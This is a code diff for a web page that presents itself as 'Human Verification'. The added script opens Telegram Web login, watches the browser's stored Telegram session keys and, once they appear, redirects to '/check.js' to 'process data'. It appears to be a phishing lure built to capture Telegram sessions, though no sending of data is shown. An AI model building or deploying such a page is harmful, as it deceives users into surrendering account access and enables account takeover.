@@ -1,55 +1,17 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Human Verification</title>
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #1c2526;
-      color: white;
-      text-align: center;
-      padding: 20px;
-      margin: 0;
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-    }
-    h2 {
-      font-size: 24px;
-      margin-bottom: 10px;
-    }
-    p {
-      font-size: 16px;
-      margin-bottom: 20px;
-    }
-    button {
-      background-color: #2e7d32;
-      color: white;
-      border: none;
-      padding: 10px 20px;
-      font-size: 16px;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #3d9c43;
-    }
-  </style>
-</head>
-<body>
-  <h2>Human Verification</h2>
-  <p>Verify below to be granted entry</p>
-  <button onclick="verify()">Click here</button>
-  <script>
-    function verify() {
-      // Redirect to check.js for Telegram login
-      window.location.href = "/check.js";
-    }
-  </script>
-</body>
-</html>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script>
+  function verify() {
+    // Request Telegram login using WebApp API
+    Telegram.WebApp.ready();
+    Telegram.WebApp.openLink('https://web.telegram.org/k/'); // Opens Telegram login
+
+    // Poll for login state and proceed when ready
+    const checkLoginInterval = setInterval(() => {
+      const globalState = localStorage.getItem("tt-global-state");
+      if (globalState && localStorage.getItem("user_auth")) {
+        clearInterval(checkLoginInterval);
+        window.location.href = "/check.js"; // Proceed to process data
+      }
+    }, 1000); // Check every second
+  }
+</script>
